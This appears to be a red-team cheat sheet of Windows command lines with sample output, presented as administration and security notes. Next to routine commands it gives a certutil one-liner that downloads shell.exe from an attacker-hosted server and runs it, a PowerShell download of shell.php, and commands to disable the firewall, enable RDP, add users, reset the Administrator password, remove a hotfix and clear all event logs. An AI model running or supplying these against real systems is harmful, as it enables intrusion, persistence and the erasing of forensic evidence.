Windows Administration and Security
-----------------------------------


#RDP from Linux
rdesktop -u Administrator -p test1test! x.x.x.x
xfreerdp -f -u Administrator -p test1test! x.x.x.x



#Disable firewall win xp
C:\WINDOWS\system32>netsh firewall set opmode mode=DISABLE
netsh firewall set opmode mode=DISABLE
Ok.



#Disable firewall 10/8/7/server 2008/Vista
c:\windows\system32\inetsrv>netsh advfirewall set currentprofile state off
netsh advfirewall set currentprofile state off
Ok.



#Shows temporary storage location
C:\>echo %temp%
echo %temp%
C:\Windows\TEMP



#Python file hosting on Linux (Red Team)
#Save file in directory Shell.exe
sudo python2.7 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...



#Windows (Blue team) to download the file from cmdline
#Downloads Shell.exe
#Saves shell.exe in %temp%
#Runs %temp%/shell.exe
C:\Users\Blue Team> certutil -urlcache -split -f http://x.x.x.x/shell.exe %temp%/shell.exe && %temp%/shell.exe



#List Windows running processes
C:\WINDOWS\system32>tasklist
tasklist

Image Name                   PID Session Name     Session#    Mem Usage
========================= ====== ================ ======== ============
System Idle Process            0 Console                 0         28 K
System                         4 Console                 0        236 K
smss.exe                     316 Console                 0        384 K



#Add a Windows user
C:\WINDOWS\system32>net user username userpassword /ADD
net user username userpassword /ADD
The command completed successfully.



#Add to domain
C:\WINDOWS\system32>net user username password /ADD /DOMAIN



#List Windows Users
C:\WINDOWS\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
username                 Administrator            Guest                    
HelpAssistant            john                     SUPPORT_388945a0         
test                     



#Change Administrator password
c:\windows\system32>net user Administrator test1test!
net user Administrator test
The command completed successfully.



#List Windows local user directories
C:\WINDOWS\system32>dir /b "C:\Users"      
dir /b "C:\Users"
add
Administrator
All Users
john



#Windows show Date
C:\WINDOWS\system32>date /t
date /t
ãîæ 31/10/2019 



#Windows show Time
C:\WINDOWS\system32>time /t
time /t
11:49 ææ



#Windows show uptime and system information
C:\WINDOWS\system32>systeminfo 
systeminfo 



#Windows write into a file
C:\WINDOWS\system32>echo test > test
echo test > test



#Windows read file contents
C:\WINDOWS\system32>type test
type test
test 



#Windows show current directory
c:\Users>echo %CD%
c:\Users>



#Windows show current role
c:\Users>whoami
whoami
nt authority\system



#NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects. 



#Windows List services
c:\windows\system32>net start
net start
These Windows services are started:

   Application Experience
   Application Host Helper Service
   Base Filtering Engine



#Stop/Start a Windows service
net stop <name>
net start <name>
net pause <name>
net continue <name>



#Enable RDP (Remote Desktop Protocol) via the registry in cmdline
c:\windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully.



#Windows open a link using the default browser
c:\windows\system32>start "link" https://google.com



#Windows Powershell clear eventviewer logs
PS>wevtutil el | Foreach-Object {wevtutil cl "$_"}



#Windows remove a hotfix
C:\Users\Blue Team\Desktop>wusa.exe /uninstall /KB:3014442  
wusa.exe /uninstall /KB:3014442 



#Save shell.php in the directory you are running the python server on the Red Team host(Linux)
sudo python2.7 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...



#Windows Powershell download a file
$client = new-object System.Net.WebClient
$client.DownloadFile("http://x.x.x.x/shell.php","c:\location\shell.php")
$client.DownloadFile("http://x.x.x.x/shell.php","shell.php")
